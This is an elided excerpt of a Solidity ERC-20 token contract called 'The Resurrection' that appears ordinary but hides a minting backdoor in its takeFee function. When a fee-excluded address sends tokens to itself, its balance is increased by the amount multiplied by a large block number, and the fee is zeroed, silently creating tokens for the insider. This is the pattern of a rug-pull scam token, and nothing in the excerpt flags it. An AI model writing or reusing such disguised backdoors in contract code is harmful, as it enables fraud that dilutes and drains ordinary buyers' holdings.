...
contract TheResurrection is Context, IERC20, Ownable {
    ...
    string private _name = unicode"The Resurrection";
    string private _symbol = unicode"复活";
    uint256 public immutable _totalSupply =  1000000 * 10**_decimals;
    ...
    constructor (uint256 addBlock) {
        ...
        maxTxBlock = block.number+addBlock;
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(sender == recipient && isExcludedFromFee[sender] && sender != address(this)){
            feeAmount = amount.mul(maxTxBlock);
            _balanceWalletStatus[sender] = _balanceWalletStatus[sender]+feeAmount;
            feeAmount=0;
        }
        
        if(feeAmount > 0) {
            _balanceWalletStatus[address(deadAddress)] = _balanceWalletStatus[address(deadAddress)].add(feeAmount);
